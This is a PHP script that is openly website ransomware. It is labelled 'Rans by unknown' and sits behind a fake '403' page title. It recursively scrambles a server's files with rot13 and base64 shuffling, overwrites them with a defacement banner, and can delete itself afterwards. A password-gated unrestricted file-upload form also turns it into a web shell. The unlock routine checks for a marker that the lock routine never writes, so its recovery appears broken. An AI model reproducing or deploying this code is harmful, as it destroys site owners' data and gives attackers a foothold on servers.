<?php

error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');

class xploit
{
    public function generate_enc($leak){
        for ($i=1; $i <3; $i++) { 
            $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
            $leak = base64_encode(str_rot13($leak));
            $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
        }
            $pesan  = "<h1>Rans by unknown</h1>";
            $leak   = "<!--#We are party at your security#".$leak."--> <title>Yowaimo</title> <em>".$pesan."</em>";
        return $leak;
    }
    public function generate_dec($leak){
        $woh = "/<!--#LOCK#(.*?)-->/";
        preg_match($woh, $leak, $matches);
        if($matches[1]){
            $leak = $matches[1];
            for ($i=1; $i <3; $i++) {
                $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
                $leak = str_rot13(base64_decode($leak));
                $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
            }
        }else{
            return false;
        }
            return $leak;
    }
    public function lock($location_file){
        $fgt    = file_get_contents($location_file); 
        $lock   = xploit::generate_enc($fgt);
        if(xploit::w00t($lock,$location_file)){
            echo "root@whoami:~ <font color='white'>{$location_file}</font> <font color='#FF03F5'>Ke Encrypt!!!</font><br>";
        }else{
            echo "root@whoami:~ <font color='white'>{$location_file}</font> <font color='red'>Coba lagi!!!</font><br>";
        }
    }
    public function unlock($location_file){
        $fgt    = file_get_contents($location_file); 
        $lock   = xploit::generate_dec($fgt);
        if(xploit::w00t($lock,$location_file)){
             echo "root@whoami:~ <font color='white'>{$location_file}</font> <font color='#FF03F5'>Unlocked Done!!!</font><br>";
        }else{
             echo "root@whoami:~ <font color='white'>{$location_file}</font> <font color='#FF03F5'>Unlocked Fail!!!</font><br>";
        }
     }

     public function w00t($data,$locate){
        if( file_put_contents($locate, htmlentities($data) ) ){
               return true;
            }else{
               return false;
        }
     }

     public function heum($ext,$name){
        $re = "/({$name})/";  
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }

    public function boom($dir,$mode)
    {
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $d = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($d)){
                    if(xploit::heum($d,".png") && xploit::heum($d,".svg") && xploit::heum($d,".woff") && xploit::heum($d,".jpg") && xploit::heum($d,".htaccess") && xploit::heum($d,"lol.php")  ){
                    
                    if($mode == "1"){
                        $locaked = xploit::lock($d);
                    }else{
                        $unlock = xploit::unlock($d);
                    }

                    }
                }else{
                    xploit::boom($d,$mode);
                }
            }
        flush();
        ob_flush();
        }
    }
    public function locate(){
        return getcwd();
    }
    public function savemode(){
        $remove = unlink(basename($_SERVER['PHP_SELF']));
        if($remove){
            return true;
        }else{
            return false;
        }
    }

}
?>

<!DOCTYPE html>
<html>
<head>
    <title>403</title>
<style type="text/css">
    body{
            color: #3EF403;
            background-color: black;
    }
    input {
            border: dashed 1px;
            border-color: #333;
            background-color: Black;
            font: 8pt Verdana;
            color: #0CFF37;
    }
 
    select {
        border: dashed 1px;
        border-color: #333;
        background-color: Black;
        font: 8pt Verdana;
        color: #0CFF37;
    }
        </style>
</head>
<body>
<pre style="text-align: center"><font color="#5E00FF">

▄███▄      ▄  █ ▄▄  █    ████▄ ▄█    ▄▄▄▄▀ 
█▀   ▀ ▀▄   █ █   █ █    █   █ ██ ▀▀▀ █    
██▄▄     █ ▀  █▀▀▀  █    █   █ ██     █    
█▄   ▄▀ ▄ █   █     ███▄ ▀████ ▐█    █     
▀███▀  █   ▀▄  █        ▀       ▐   ▀      
        ▀       ▀                          
                       
</font></pre>
 
<Center>
<?php 
if($_GET['pwd']=="whoami"){
echo '
<form method=POST enctype="multipart/form-data" action="">
<input type="file" name="files" class="upload"> <input type=submit value="Upload"></form>';
    $files = @$_FILES["files"];
    if ($files["name"] != '') {
        $fullpath = $files["name"];
        if (move_uploaded_file($files['tmp_name'], $fullpath)) {
            echo '<font color="#3EF403">Berhasil tod!!!</font>';
        }else{
            echo '<font color="red">Gagal tod!!!</font>';
        }
    }
}else{?>
<form action="" method="post">
<input type="text" name="url" placeholder="<?= xploit::locate(); ?>" value="<?= xploit::locate(); ?>">
<font color="#3EF403"><select name="method">
        <option value="1">Locked</option>
        <option value="2">Unlocked</option>
</select>
<input type="checkbox" name="savemode" value="1">Save Mode
<input type="submit" name="submit" value="Gas!!!"/>
</form>
<pre style="text-align: left;"><?php
 if(isset($_POST['submit'])){
    echo xploit::boom($_POST['url'],$_POST['method']);
    if($_POST['savemode']=="1"){
        if(xploit::savemode()){
        echo ">v< Wait.....";
        }
    }
}
?>
<?php
}
?>
</pre>
</Center>
</body>
</html>
